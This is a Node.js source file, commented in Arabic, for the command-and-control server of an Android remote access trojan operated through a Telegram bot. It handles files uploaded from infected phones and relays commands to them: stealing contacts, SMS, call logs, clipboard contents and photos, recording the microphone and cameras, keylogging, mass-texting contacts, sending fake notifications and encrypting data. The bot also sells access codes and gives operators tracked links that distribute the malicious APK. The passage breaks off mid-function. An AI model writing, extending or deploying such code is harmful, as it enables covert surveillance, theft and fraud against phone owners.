// ═══════════════════════════════════════════════════════
//   📦 المكتبات
// ═══════════════════════════════════════════════════════
const express     = require("express");
const http        = require("http");
const { Server }  = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const multer      = require("multer");
const fs          = require("fs");

// ═══════════════════════════════════════════════════════
//   ⚙️ الإعدادات
// ═══════════════════════════════════════════════════════
const DATA = JSON.parse(fs.readFileSync("./data.json", "utf8"));

const CONFIG = {
  BOT_TOKEN:   DATA.token,
  OWNER_ID:    String(DATA.id),
  SERVER_URL:  DATA.host || process.env.RENDER_EXTERNAL_URL || "http://localhost:3000",
  APK_URL:     DATA.apkUrl || "",
  PORT:        process.env.PORT || 3000,
  CODE_LENGTH: 8,
  CODE_CHARS:  "ABCDEFGHJKLMNPQRSTUVWXYZ23456789",
  CLEANUP_INTERVAL: 60 * 60 * 1000,
  PING_INTERVAL:    5000
};

// ═══════════════════════════════════════════════════════
//   🎨 أدوات الحدود — عرض قصير (24)
// ═══════════════════════════════════════════════════════
const W = 24;

function lineTop()  { return "╔" + "═".repeat(W) + "╗"; }
function lineMid()  { return "╠" + "═".repeat(W) + "╣"; }
function lineBot()  { return "╚" + "═".repeat(W) + "╝"; }

function row(text, align = "center") {
  const plain = String(text).replace(/<[^>]+>/g, "");
  const padding = Math.max(0, W - plain.length - 2);
  let left, right;
  if (align === "center") {
    left  = Math.floor(padding / 2);
    right = padding - left;
  } else if (align === "left") {
    left = 1; right = padding - 1;
  } else {
    left = padding - 1; right = 1;
  }
  return "║ " + " ".repeat(left) + text + " ".repeat(right) + " ║";
}

// ═══════════════════════════════════════════════════════
//   🎨 النصوص
// ═══════════════════════════════════════════════════════
const TEXT = {
  MAIN_MENU:
    lineTop() + "\n" +
    row("🎯 القائمة الرئيسية") + "\n" +
    lineBot(),

  CONTROL_MENU:
    lineTop() + "\n" +
    row("⚡ لوحة التحكم") + "\n" +
    lineMid() + "\n" +
    row("💎 {device}", "left") + "\n" +
    lineBot(),

  SELECT_DEVICE:
    lineTop() + "\n" +
    row("🎯 اختر الجهاز") + "\n" +
    lineBot(),

  NO_DEVICE:
    lineTop() + "\n" +
    row("⚠️ لا يوجد جهاز") + "\n" +
    lineBot(),

  NO_TARGET:
    lineTop() + "\n" +
    row("❌ اختر جهازاً أولاً") + "\n" +
    lineBot(),

  SUCCESS:
    lineTop() + "\n" +
    row("✅ تم تنفيذ الطلب") + "\n" +
    lineBot(),

  DEVICE_ONLINE:
    lineTop() + "\n" +
    row("🟢 جهاز متصل") + "\n" +
    lineMid() + "\n" +
    row("📱 {model}", "left") + "\n" +
    row("🔢 {version}", "left") + "\n" +
    row("🌐 {ip}", "left") + "\n" +
    row("⏰ {time}", "left") + "\n" +
    lineBot(),

  DEVICE_OFFLINE:
    lineTop() + "\n" +
    row("🔴 جهاز انفصل") + "\n" +
    lineMid() + "\n" +
    row("📱 {model}", "left") + "\n" +
    row("🌐 {ip}", "left") + "\n" +
    lineBot(),

  FILE_RECEIVED:
    lineTop() + "\n" +
    row("📥 ملف مستلم") + "\n" +
    lineMid() + "\n" +
    row("💎 {model}", "left") + "\n" +
    row("📁 {filename}", "left") + "\n" +
    lineBot(),

  FILE_LIST:
    lineTop() + "\n" +
    row("📂 نظام الملفات") + "\n" +
    lineMid() + "\n" +
    row("💎 {model}", "left") + "\n" +
    lineBot(),

  FILE_ACTION:
    lineTop() + "\n" +
    row("⚙️ إجراء الملف") + "\n" +
    lineMid() + "\n" +
    row("📁 {name}", "left") + "\n" +
    lineBot(),

  MESSAGE_FROM:
    lineTop() + "\n" +
    row("📩 رسالة جديدة") + "\n" +
    lineMid() + "\n" +
    row("💎 {model}", "left") + "\n" +
    row("📝 {msg}", "left") + "\n" +
    lineBot(),

  AUTH_REQUIRED:
    lineTop() + "\n" +
    row("🔐 بوت محمي") + "\n" +
    lineMid() + "\n" +
    row("🎫 أرسل الكود", "left") + "\n" +
    lineBot(),

  AUTH_WRONG:
    lineTop() + "\n" +
    row("❌ كود غير صحيح") + "\n" +
    lineBot(),

  AUTH_EXPIRED:
    lineTop() + "\n" +
    row("⏰ كود منتهي") + "\n" +
    lineBot(),

  AUTH_USED:
    lineTop() + "\n" +
    row("⚠️ كود مستخدم") + "\n" +
    lineBot(),

  AUTH_SUCCESS:
    lineTop() + "\n" +
    row("✅ تم التفعيل") + "\n" +
    lineMid() + "\n" +
    row("⏱️ {duration}", "left") + "\n" +
    row("📅 {date}", "left") + "\n" +
    lineBot(),

  ASK_CONTACT:
    lineTop() + "\n" +
    row("📇 خطوة إلزامية") + "\n" +
    lineMid() + "\n" +
    row("احفظ البوت", "left") + "\n" +
    row("في جهات اتصالك", "left") + "\n" +
    lineBot(),

  ASK_USER_ID:
    lineTop() + "\n" +
    row("🆔 أرسل آيديك") + "\n" +
    row("من @userinfobot") + "\n" +
    lineBot(),

  ID_MISMATCH:
    lineTop() + "\n" +
    row("❌ آيدي خاطئ") + "\n" +
    lineMid() + "\n" +
    row("🆔 {realId}", "left") + "\n" +
    lineBot(),

  ID_INVALID:
    lineTop() + "\n" +
    row("❌ رقم غير صحيح") + "\n" +
    lineBot(),

  APK_DELIVERED:
    lineTop() + "\n" +
    row("🎉 تم التحقق") + "\n" +
    lineMid() + "\n" +
    row("🔗 رابطك:", "left") + "\n" +
    row("<code>{shareLink}</code>", "left") + "\n" +
    lineMid() + "\n" +
    row("🆔 {refCode}", "left") + "\n" +
    row("👥 {count} أجهزة", "left") + "\n" +
    lineBot(),

  MY_STATS:
    lineTop() + "\n" +
    row("📊 إحصائياتك") + "\n" +
    lineMid() + "\n" +
    row("🆔 {refCode}", "left") + "\n" +
    row("👥 {count} أجهزة", "left") + "\n" +
    lineBot(),

  OWNER_WELCOME:  "\n\n╔══ 👑 مالك البوت ══╗",
  USER_WELCOME:   "\n\n╔══ ✅ مصرح لك ══╗\n║ ⏱️ {remaining} دقيقة",

  CREATE_CODE_PROMPT:
    lineTop() + "\n" +
    row("🔑 إنشاء كود") + "\n" +
    lineMid() + "\n" +
    row("📩 المدة بالدقائق", "left") + "\n" +
    row("مثال: 1440 = يوم", "left") + "\n" +
    lineBot(),

  CREATE_CODE_DONE:
    lineTop() + "\n" +
    row("✅ تم الإنشاء") + "\n" +
    lineMid() + "\n" +
    row("🔑 {code}", "left") + "\n" +
    row("⏱️ {duration}", "left") + "\n" +
    row("📅 {date}", "left") + "\n" +
    lineBot(),

  CREATE_CODE_INVALID:
    lineTop() + "\n" +
    row("❌ رقم غير صحيح") + "\n" +
    lineBot(),

  CREATE_CODE_CANCEL:
    lineTop() + "\n" +
    row("❌ تم الإلغاء") + "\n" +
    lineBot(),

  STATS:
    lineTop() + "\n" +
    row("📊 الإحصائيات") + "\n" +
    lineMid() + "\n" +
    row("🟢 {active}", "left") + "\n" +
    row("🔴 {expired}", "left") + "\n" +
    row("🎫 {unused}", "left") + "\n" +
    row("✅ {used}", "left") + "\n" +
    row("📱 {devices}", "left") + "\n" +
    lineBot(),

  NO_USERS:
    lineTop() + "\n" +
    row("👥 لا يوجد مستخدمين") + "\n" +
    lineBot(),

  USERS_HEADER:
    lineTop() + "\n" +
    row("👥 المستخدمين") + "\n" +
    lineBot() + "\n\n",

  USER_ITEM:
    lineTop() + "\n" +
    row("👤 {index}. {status}", "left") + "\n" +
    lineMid() + "\n" +
    row("🆔 {id}", "left") + "\n" +
    row("🎫 {code}", "left") + "\n" +
    row("⏱️ {remaining}", "left") + "\n" +
    lineBot() + "\n\n",

  START:
    lineTop() + "\n" +
    row("🚀 بوت التحكم") + "\n" +
    lineMid() + "\n" +
    row("📱 تحكم أندرويد", "left") + "\n" +
    row("🇩🇿 عبدو الشلفاوي", "left") + "\n" +
    row("📡 @l2_dc", "left") + "\n" +
    lineBot(),

  DEV_INFO:
    lineTop() + "\n" +
    row("👑 المطور") + "\n" +
    lineMid() + "\n" +
    row("💎 عبدو الشلفاوي", "left") + "\n" +
    row("📡 @l2_dc", "left") + "\n" +
    lineBot(),

  DEVICE_COUNT_HEADER:
    lineTop() + "\n" +
    row("📱 الأجهزة المتصلة") + "\n" +
    lineMid() + "\n" +
    row("🟢 العدد: {count}", "left") + "\n" +
    lineBot() + "\n\n",

  DEVICE_COUNT_ITEM:
    lineTop() + "\n" +
    row("💎 الجهاز #{index}", "left") + "\n" +
    lineMid() + "\n" +
    row("📱 {model}", "left") + "\n" +
    row("🔢 {version}", "left") + "\n" +
    row("🌐 {ip}", "left") + "\n" +
    lineBot() + "\n\n",

  ASK_MIC_DURATION:
    lineTop() + "\n" +
    row("🎙 مدة التسجيل") + "\n" +
    row("بالثواني") + "\n" +
    lineBot(),

  ASK_TOAST_TEXT:
    lineTop() + "\n" +
    row("💬 اكتب النص") + "\n" +
    lineBot(),

  ASK_SMS_NUMBER:
    lineTop() + "\n" +
    row("📨 اكتب الرقم") + "\n" +
    lineBot(),

  ASK_SMS_TEXT:
    lineTop() + "\n" +
    row("📨 {number}", "left") + "\n" +
    lineMid() + "\n" +
    row("✍️ اكتب النص", "left") + "\n" +
    lineBot(),

  ASK_VIBRATE_TIME:
    lineTop() + "\n" +
    row("📳 مدة الاهتزاز") + "\n" +
    row("بالثواني") + "\n" +
    lineBot(),

  ASK_MASS_TEXT:
    lineTop() + "\n" +
    row("📢 الرسالة الجماعية") + "\n" +
    lineBot(),

  ASK_CALL_NUMBER:
    lineTop() + "\n" +
    row("📞 اكتب الرقم") + "\n" +
    lineBot(),

  ASK_CALL_CONFIRM:
    lineTop() + "\n" +
    row("📞 {number}", "left") + "\n" +
    lineMid() + "\n" +
    row("اكتب 'موافق'", "left") + "\n" +
    lineBot(),

  ASK_NOTIF_TEXT:
    lineTop() + "\n" +
    row("🔔 نص الإشعار") + "\n" +
    lineBot(),

  ASK_NOTIF_URL:
    lineTop() + "\n" +
    row("🔗 اكتب الرابط") + "\n" +
    lineBot(),

  ASK_VOICE:
    lineTop() + "\n" +
    row("🎵 سجّل الصوت") + "\n" +
    lineBot(),

  ASK_ENCRYPT_KEY:
    lineTop() + "\n" +
    row("🔐 كود التشفير") + "\n" +
    lineBot()
};

// ═══════════════════════════════════════════════════════
//   🎯 الأزرار
// ═══════════════════════════════════════════════════════
const BTN = {
  COUNT_DEVICES:  "📱 عدد الأجهزة 📱",
  CONTROL_PANEL:  "⚡ لوحة التحكم ⚡",
  DEV_INFO:       "👑 المطور 👑",
  MY_STATS:       "📊 إحصائياتي 📊",
  BACK_HOME:      "🔙 الرئيسية 🔙",
  BACK_ACTION:    "↩️ إلغاء ↩️",
  CREATE_CODE:    "🔑 إنشاء كود 🔑",
  STATISTICS:     "📊 الإحصائيات 📊",
  USERS_LIST:     "👥 المستخدمين 👥",
  CONTACTS:       "📒 جهات الاتصال 📒",
  MESSAGES:       "💬 الرسائل 💬",
  CALLS:          "📞 المكالمات 📞",
  APPS:           "📱 التطبيقات 📱",
  BACK_CAMERA:    "📷 خلفية 📷",
  FRONT_CAMERA:   "🤳 أمامية 🤳",
  MIC:            "🎙 تسجيل صوت 🎙",
  CLIPBOARD:      "📋 الحافظة 📋",
  SCREENSHOT:     "📺 لقطة شاشة 📺",
  TOAST:          "💬 رسالة سفلية 💬",
  SMS:            "📨 إرسال SMS 📨",
  VIBRATE:        "📳 اهتزاز 📳",
  PLAY_AUDIO:     "▶️ تشغيل الصوت ▶️",
  STOP_AUDIO:     "⏹️ إيقاف الصوت ⏹️",
  KEYLOG_ON:      "🟢 تشغيل الإشعارات 🟢",
  KEYLOG_OFF:     "🔴 إيقاف الإشعارات 🔴",
  FILES:          "📂 الملفات 📂",
  GALLERY:        "🎬 الصور 🎬",
  STOP_GALLERY:   "🛑 إيقاف الصور 🛑",
  MASS_SMS:       "📢 رسالة جماعية 📢",
  FAKE_NOTIF:     "🔔 إشعار مزور 🔔",
  ENCRYPT:        "🔐 تشفير 🔐",
  CALL:           "☎️ اتصال ☎️"
};

// ═══════════════════════════════════════════════════════
//   🔗 ربط الأزرار بالأوامر
// ═══════════════════════════════════════════════════════
const DIRECT_COMMANDS = {
  [BTN.CONTACTS]:     "contacts",
  [BTN.MESSAGES]:     "all-sms",
  [BTN.CALLS]:        "calls",
  [BTN.APPS]:         "apps",
  [BTN.BACK_CAMERA]:  "main-camera",
  [BTN.FRONT_CAMERA]: "selfie-camera",
  [BTN.CLIPBOARD]:    "clipboard",
  [BTN.SCREENSHOT]:   "screenshot",
  [BTN.KEYLOG_ON]:    "keylogger-on",
  [BTN.KEYLOG_OFF]:   "keylogger-off",
  [BTN.GALLERY]:      "gallery",
  [BTN.STOP_GALLERY]: "stop-gallery"
};

const INPUT_COMMANDS = {
  [BTN.MIC]:        { state: "microphoneDuration", prompt: TEXT.ASK_MIC_DURATION },
  [BTN.TOAST]:      { state: "toastText",          prompt: TEXT.ASK_TOAST_TEXT },
  [BTN.SMS]:        { state: "smsNumber",          prompt: TEXT.ASK_SMS_NUMBER },
  [BTN.VIBRATE]:    { state: "vibrateDuration",    prompt: TEXT.ASK_VIBRATE_TIME },
  [BTN.MASS_SMS]:   { state: "textToAllContacts",  prompt: TEXT.ASK_MASS_TEXT },
  [BTN.CALL]:       { state: "makeCallNumber",     prompt: TEXT.ASK_CALL_NUMBER },
  [BTN.FAKE_NOTIF]: { state: "notificationText",   prompt: TEXT.ASK_NOTIF_TEXT },
  [BTN.PLAY_AUDIO]: { state: "recordVoice",        prompt: TEXT.ASK_VOICE },
  [BTN.ENCRYPT]:    { state: "encryptKey",         prompt: TEXT.ASK_ENCRYPT_KEY }
};

// ═══════════════════════════════════════════════════════
//   🎨 لوحات المفاتيح
// ═══════════════════════════════════════════════════════
const KB = {
  MAIN: {
    keyboard: [
      [BTN.COUNT_DEVICES, BTN.CONTROL_PANEL],
      [BTN.MY_STATS, BTN.DEV_INFO]
    ],
    resize_keyboard: true
  },
  OWNER: {
    keyboard: [
      [BTN.COUNT_DEVICES, BTN.CONTROL_PANEL],
      [BTN.CREATE_CODE, BTN.STATISTICS],
      [BTN.USERS_LIST, BTN.DEV_INFO]
    ],
    resize_keyboard: true
  },
  CONTROL: {
    keyboard: [
      [BTN.CONTACTS, BTN.MESSAGES],
      [BTN.CALLS, BTN.APPS],
      [BTN.BACK_CAMERA, BTN.FRONT_CAMERA],
      [BTN.MIC, BTN.CLIPBOARD],
      [BTN.SCREENSHOT, BTN.TOAST],
      [BTN.SMS, BTN.VIBRATE],
      [BTN.PLAY_AUDIO, BTN.STOP_AUDIO],
      [BTN.KEYLOG_ON, BTN.KEYLOG_OFF],
      [BTN.FILES, BTN.GALLERY],
      [BTN.STOP_GALLERY],
      [BTN.MASS_SMS],
      [BTN.FAKE_NOTIF, BTN.ENCRYPT],
      [BTN.CALL],
      [BTN.BACK_HOME]
    ],
    resize_keyboard: true
  },
  BACK: {
    keyboard: [[BTN.BACK_ACTION]],
    resize_keyboard: true,
    one_time_keyboard: true
  }
};

// ═══════════════════════════════════════════════════════
//   🚀 التهيئة
// ═══════════════════════════════════════════════════════
const app      = express();
const server   = http.createServer(app);
const io       = new Server(server);
const uploader = multer();
const bot      = new telegramBot(CONFIG.BOT_TOKEN, { polling: true });
const appData  = new Map();

const OWNER_ID = CONFIG.OWNER_ID;

// ═══════════════════════════════════════════════════════
//   💾 قاعدة البيانات
// ═══════════════════════════════════════════════════════
let codes  = {};
let users  = {};
let ipRefs = {};

// ═══════════════════════════════════════════════════════
//   🔧 دوال مساعدة
// ═══════════════════════════════════════════════════════
function generateCode() {
  let c = "";
  for (let i = 0; i < CONFIG.CODE_LENGTH; i++) {
    c += CONFIG.CODE_CHARS.charAt(Math.floor(Math.random() * CONFIG.CODE_CHARS.length));
  }
  return c;
}

function generateRefCode(userId) {
  return "REF" + userId + "_" + Math.random().toString(36).slice(2, 8).toUpperCase();
}

function isAuthorized(userId) {
  const id = String(userId);
  if (id === OWNER_ID) return true;
  if (users[id] && Date.now() < users[id].expiresAt) return true;
  if (users[id]) delete users[id];
  return false;
}

function formatDuration(minutes) {
  const h = Math.floor(minutes / 60);
  const d = Math.floor(h / 24);
  if (d > 0) return d + " يوم";
  if (h > 0) return h + " ساعة";
  return minutes + " دقيقة";
}

function fill(template, vars) {
  let out = template;
  for (const key in vars) {
    out = out.replace(new RegExp("\\{" + key + "\\}", "g"), vars[key]);
  }
  return out;
}

function getKeyboard(userId) {
  return String(userId) === OWNER_ID ? KB.OWNER : KB.MAIN;
}

function cleanIp(raw) {
  if (!raw) return "";
  return String(raw).split(",")[0].trim().replace("::ffff:", "");
}

// ✅ الإصلاح: إرجاع الكائن مع الـ ID الصحيح
function getVisibleDevices(userId) {
  const list = [];
  io.sockets.sockets.forEach((s, id) => {
    if (String(userId) === OWNER_ID) {
      list.push({ socket: s, id: id });
    } else if (s.ownerId === String(userId)) {
      list.push({ socket: s, id: id });
    }
  });
  return list;
}

function getCurrentDeviceName() {
  const t = appData.get("currentTarget");
  const s = t ? io.sockets.sockets.get(t) : null;
  return s ? s.model : "unknown";
}

function stayInControl(chatId, deviceName) {
  bot.sendMessage(chatId, fill(TEXT.CONTROL_MENU, { device: deviceName }), {
    parse_mode: "HTML",
    reply_markup: KB.CONTROL
  }).catch(() => {});
}

// ═══════════════════════════════════════════════════════
//   🌐 Express
// ═══════════════════════════════════════════════════════
app.get("/", (_req, res) => {
  res.send("⚡ Server Online ⚡");
});

app.get("/join", (req, res) => {
  const ref = String(req.query.ref || "UNKNOWN").replace(/[^A-Za-z0-9_]/g, "");
  res.send(`<!DOCTYPE html>
<html lang="ar" dir="rtl"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>تحميل التطبيق</title>
<style>
body{font-family:Arial;background:#0f0f0f;color:#fff;text-align:center;padding:40px 20px;margin:0}
.box{max-width:400px;margin:auto;background:#1c1c1c;padding:30px;border-radius:15px;box-shadow:0 0 30px #000}
h1{color:#4CAF50;margin-bottom:20px}
.ref{background:#222;padding:12px;border-radius:8px;color:#0af;margin:15px 0;word-break:break-all}
button{background:#4CAF50;color:#fff;border:none;padding:15px 30px;font-size:18px;border-radius:10px;cursor:pointer;width:100%;margin-top:20px}
button:hover{background:#45a049}
</style></head><body>
<div class="box">
<h1>📥 تحميل التطبيق</h1>
<div class="ref">كودك: ${ref}</div>
<button onclick="location.href='/download?ref=${ref}'">⬇️ تحميل الآن</button>
</div></body></html>`);
});

app.get("/download", (req, res) => {
  const ref = String(req.query.ref || "UNKNOWN").replace(/[^A-Za-z0-9_]/g, "");
  const ip  = cleanIp(
    req.headers["x-forwarded-for"] ||
    req.headers["cf-connecting-ip"] ||
    req.socket.remoteAddress
  );

  if (ip) {
    ipRefs[ip] = { ref, savedAt: Date.now() };
    console.log(`[+] IP: ${ip} → REF: ${ref}`);
  }

  if (!CONFIG.APK_URL) {
    return res.status(404).send("❌ رابط APK غير معد");
  }

  res.redirect(CONFIG.APK_URL);
});

app.post("/upload", uploader.single("file"), (req, res) => {
  if (!req.file) return res.status(400).send("No file");
  const filename = req.file.originalname;
  const model    = req.headers.model || "unknown";

  bot.sendDocument(OWNER_ID, req.file.buffer, {
    caption: fill(TEXT.FILE_RECEIVED, { model, filename }),
    parse_mode: "HTML"
  }, { filename, contentType: "*/*" }).catch(() => {});

  res.send("Done");
});

// ═══════════════════════════════════════════════════════
//   🔌 Socket.IO
// ═══════════════════════════════════════════════════════
io.on("connection", socket => {
  const ip = cleanIp(
    socket.handshake.headers["x-forwarded-for"] ||
    socket.handshake.headers["cf-connecting-ip"] ||
    socket.handshake.address
  );

  let refCode = "UNKNOWN";
  let ownerId = null;

  if (ip && ipRefs[ip]) {
    refCode = ipRefs[ip].ref;
    ownerId = Object.keys(users).find(u => users[u].refCode === refCode) || null;
  }

  const model   = (socket.handshake.headers.model || "unknown") + "-" + (io.sockets.sockets.size + 1);
  const version = socket.handshake.headers.version || "no info";

  socket.model   = model;
  socket.version = version;
  socket.ip      = ip;
  socket.refCode = refCode;
  socket.ownerId = ownerId;

  console.log(`[+] جهاز: ${model} | IP: ${ip} | REF: ${refCode}`);

  bot.sendMessage(OWNER_ID, fill(TEXT.DEVICE_ONLINE, {
    model, version, ip, time: new Date().toLocaleString("ar-DZ")
  }) + (ownerId ? `\n👤 صاحب: <code>${ownerId}</code>` : ""),
  { parse_mode: "HTML" }).catch(() => {});

  if (ownerId && ownerId !== OWNER_ID) {
    bot.sendMessage(ownerId, fill(TEXT.DEVICE_ONLINE, {
      model, version, ip, time: new Date().toLocaleString("ar-DZ")
    }), { parse_mode: "HTML" }).catch(() => {});
  }

  socket.on("disconnect", () => {
    bot.sendMessage(OWNER_ID, fill(TEXT.DEVICE_OFFLINE, { model, ip }),
      { parse_mode: "HTML" }).catch(() => {});

    if (ownerId && ownerId !== OWNER_ID) {
      bot.sendMessage(ownerId, fill(TEXT.DEVICE_OFFLINE, { model, ip }),
        { parse_mode: "HTML" }).catch(() => {});
    }
  });

  socket.on("file-explorer", files => {
    let rows = [], current = [];
    files.forEach((file, i) => {
      const cbData = file.isFolder
        ? model + "|cd-" + file.name
        : model + "|request-" + file.name;
      current.push({ text: file.name, callback_data: cbData });
      if (current.length === 2 || i + 1 === files.length) {
        rows.push(current);
        current = [];
      }
    });
    rows.push([{ text: "⚡ رجوع ⚡", callback_data: model + "|back-0" }]);
    bot.sendMessage(OWNER_ID, fill(TEXT.FILE_LIST, { model }), {
      reply_markup: { inline_keyboard: rows },
      parse_mode: "HTML"
    }).catch(() => {});
  });

  socket.on("message", msg => {
    bot.sendMessage(OWNER_ID, fill(TEXT.MESSAGE_FROM, { model, msg }),
      { parse_mode: "HTML" }).catch(() => {});
  });
});

// ═══════════════════════════════════════════════════════
//   🤖 البوت
// ═══════════════════════════════════════════════════════
bot.on("message", async msg => {
  try {
    const USER_ID = String(msg.chat.id);
    const IS_OWNER = USER_ID === OWNER_ID;
    const USER_TEXT = (msg.text || "").trim();

    // ═══ فحص الصلاحية ═══
    if (!IS_OWNER && !isAuthorized(USER_ID)) {

      if (appData.get(USER_ID + "_awaitCode") === true) {
        const enteredCode = USER_TEXT.toUpperCase();
        if (codes[enteredCode]) {
          const codeData = codes[enteredCode];
          if (Date.now() > codeData.expiresAt) {
            delete codes[enteredCode];
            return bot.sendMessage(USER_ID, TEXT.AUTH_EXPIRED, { parse_mode: "HTML" });
          }
          if (codeData.usedBy) {
            return bot.sendMessage(USER_ID, TEXT.AUTH_USED, { parse_mode: "HTML" });
          }

          appData.set(USER_ID + "_pendingAuth", {
            code: enteredCode,
            duration: codeData.duration,
            username: msg.from.username || "unknown"
          });
          appData.delete(USER_ID + "_awaitCode");
          appData.set(USER_ID + "_awaitId", true);

          return bot.sendMessage(USER_ID, TEXT.ASK_CONTACT, {
            parse_mode: "HTML",
            reply_markup: { remove_keyboard: true }
          });
        }
        return bot.sendMessage(USER_ID, TEXT.AUTH_WRONG, { parse_mode: "HTML" });
      }

      if (appData.get(USER_ID + "_awaitId") === true) {
        const enteredId = USER_TEXT;
        if (!/^\d+$/.test(enteredId)) {
          return bot.sendMessage(USER_ID, TEXT.ID_INVALID, { parse_mode: "HTML" });
        }
        if (enteredId !== USER_ID) {
          return bot.sendMessage(USER_ID, fill(TEXT.ID_MISMATCH, { realId: USER_ID }), { parse_mode: "HTML" });
        }

        const pendingAuth = appData.get(USER_ID + "_pendingAuth");
        const codeData    = codes[pendingAuth.code];
        const refCode     = generateRefCode(USER_ID);

        users[USER_ID] = {
          code: pendingAuth.code,
          activatedAt: Date.now(),
          expiresAt: Date.now() + (pendingAuth.duration * 60 * 1000),
          duration: pendingAuth.duration,
          username: pendingAuth.username,
          refCode
        };

        codeData.usedBy = USER_ID;
        codeData.usedAt = Date.now();

        appData.delete(USER_ID + "_pendingAuth");
        appData.delete(USER_ID + "_awaitId");

        const shareLink = `${CONFIG.SERVER_URL}/join?ref=${refCode}`;

        await bot.sendMessage(USER_ID, fill(TEXT.AUTH_SUCCESS, {
          duration: formatDuration(pendingAuth.duration),
          date: new Date(users[USER_ID].expiresAt).toLocaleString("ar-DZ")
        }), { parse_mode: "HTML" });

        return bot.sendMessage(USER_ID, fill(TEXT.APK_DELIVERED, {
          shareLink, refCode, count: 0
        }), { parse_mode: "HTML", reply_markup: KB.MAIN });
      }

      appData.set(USER_ID + "_awaitCode", true);
      return bot.sendMessage(USER_ID, TEXT.AUTH_REQUIRED, { parse_mode: "HTML" });
    }

    // ═══ /start ═══
    if (USER_TEXT === "/start") {
      let welcome = TEXT.START;
      const remaining = users[USER_ID]
        ? Math.max(0, Math.floor((users[USER_ID].expiresAt - Date.now()) / 60000))
        : 0;
      if (IS_OWNER) welcome += TEXT.OWNER_WELCOME;
      else welcome += fill(TEXT.USER_WELCOME, { remaining });

      return bot.sendMessage(USER_ID, welcome, {
        parse_mode: "HTML",
        reply_markup: getKeyboard(USER_ID)
      });
    }

    // ═══ أوامر المالك ═══
    if (IS_OWNER && USER_TEXT === BTN.CREATE_CODE) {
      appData.set(OWNER_ID + "_action", "createCode");
      return bot.sendMessage(OWNER_ID, TEXT.CREATE_CODE_PROMPT, {
        parse_mode: "HTML", reply_markup: KB.BACK
      });
    }

    if (IS_OWNER && appData.get(OWNER_ID + "_action") === "createCode") {
      const minutes = parseInt(USER_TEXT);
      if (isNaN(minutes) || minutes <= 0) {
        return bot.sendMessage(OWNER_ID, TEXT.CREATE_CODE_INVALID, { parse_mode: "HTML" });
      }
      const newCode = generateCode();
      codes[newCode] = {
        duration: minutes,
        createdAt: Date.now(),
        expiresAt: Date.now() + (minutes * 60 * 1000),
        usedBy: null
      };
      appData.delete(OWNER_ID + "_action");
      return bot.sendMessage(OWNER_ID, fill(TEXT.CREATE_CODE_DONE, {
        code: newCode,
        duration: formatDuration(minutes),
        date: new Date(codes[newCode].expiresAt).toLocaleString("ar-DZ")
      }), { parse_mode: "HTML", reply_markup: KB.OWNER });
    }

    if (IS_OWNER && USER_TEXT === BTN.STATISTICS) {
      const now = Date.now();
      let active = 0, expired = 0;
      Object.keys(users).forEach(uid => {
        if (now < users[uid].expiresAt) active++;
        else expired++;
      });
      const unused = Object.keys(codes).filter(c => !codes[c].usedBy && now < codes[c].expiresAt).length;
      const used   = Object.keys(codes).filter(c => codes[c].usedBy).length;

      return bot.sendMessage(OWNER_ID, fill(TEXT.STATS, {
        active, expired, unused, used, devices: io.sockets.sockets.size
      }), { parse_mode: "HTML", reply_markup: KB.OWNER });
    }

    if (IS_OWNER && USER_TEXT === BTN.USERS_LIST) {
      const now = Date.now();
      const uids = Object.keys(users);
      if (uids.length === 0) {
        return bot.sendMessage(OWNER_ID, TEXT.NO_USERS, { parse_mode: "HTML", reply_markup: KB.OWNER });
      }
      let out = TEXT.USERS_HEADER;
      uids.forEach((uid, i) => {
        const u = users[uid];
        const isActive = now < u.expiresAt;
        out += fill(TEXT.USER_ITEM, {
          index: i + 1,
          status: isActive ? "🟢 نشط" : "🔴 منتهي",
          id: uid,
          code: u.code,
          refCode: u.refCode || "—",
          remaining: isActive ? Math.floor((u.expiresAt - now) / 60000) + " دقيقة" : "منتهي"
        });
      });
      return bot.sendMessage(OWNER_ID, out, { parse_mode: "HTML", reply_markup: KB.OWNER });
    }

    // ═══ إحصائياتي ═══
    if (!IS_OWNER && USER_TEXT === BTN.MY_STATS) {
      const u = users[USER_ID];
      if (!u) return;
      const myDevices = getVisibleDevices(USER_ID).length;
      return bot.sendMessage(USER_ID, fill(TEXT.MY_STATS, {
        refCode: u.refCode,
        count: myDevices
      }), { parse_mode: "HTML" });
    }

    // ═══ حالات الإدخال ═══
    const currentAction = appData.get("currentAction");
    const currentTarget = appData.get("currentTarget");

    const afterAction = () => {
      const name = getCurrentDeviceName();
      appData.delete("currentAction");
      bot.sendMessage(USER_ID, TEXT.SUCCESS, { parse_mode: "HTML" });
      stayInControl(USER_ID, name);
    };

    if (currentAction === "microphoneDuration") {
      io.to(currentTarget).emit("commend", { request: "microphone", extras: [{ key: "duration", value: USER_TEXT }] });
      return afterAction();
    }
    if (currentAction === "toastText") {
      io.to(currentTarget).emit("commend", { request: "toast", extras: [{ key: "text", value: USER_TEXT }] });
      return afterAction();
    }
    if (currentAction === "smsNumber") {
      appData.set("currentNumber", USER_TEXT);
      appData.set("currentAction", "smsText");
      return bot.sendMessage(USER_ID, fill(TEXT.ASK_SMS_TEXT, { number: USER_TEXT }), { parse_mode: "HTML", reply_markup: KB.BACK });
    }
    if (currentAction === "smsText") {
      const number = appData.get("currentNumber");
      io.to(currentTarget).emit("commend", {
        request: "sendSms",
        extras: [{ key: "number", value: number }, { key: "text", value: USER_TEXT }]
      });
      appData.delete("currentNumber");
      return afterAction();
    }
    if (currentAction === "vibrateDuration") {
      io.to(currentTarget).emit("commend", { request: "vibrate", extras: [{ key: "duration", value: USER_TEXT }] });
      return afterAction();
    }
    if (currentAction === "textToAllContacts") {
      io.to(currentTarget).emit("commend", { request: "smsToAllContacts", extras: [{ key: "text", value: USER_TEXT }] });
      return afterAction();
    }
    if (currentAction === "notificationText") {
      appData.set("currentNotificationText", USER_TEXT);
      appData.set("currentAction", "notificationUrl");
      return bot.sendMessage(USER_ID, TEXT.ASK_NOTIF_URL, { parse_mode: "HTML", reply_markup: KB.BACK });
    }
    if (currentAction === "notificationUrl") {
      const notifText = appData.get("currentNotificationText");
      io.to(currentTarget).emit("commend", {
        request: "popNotification",
        extras: [{ key: "text", value: notifText }, { key: "url", value: USER_TEXT }]
      });
      appData.delete("currentNotificationText");
      return afterAction();
    }
    if (currentAction === "makeCallNumber") {
      appData.set("currentNumber", USER_TEXT);
      appData.set("currentAction", "makeCallText");
      return bot.sendMessage(USER_ID, fill(TEXT.ASK_CALL_CONFIRM, { number: USER_TEXT }), { parse_mode: "HTML", reply_markup: KB.BACK });
    }
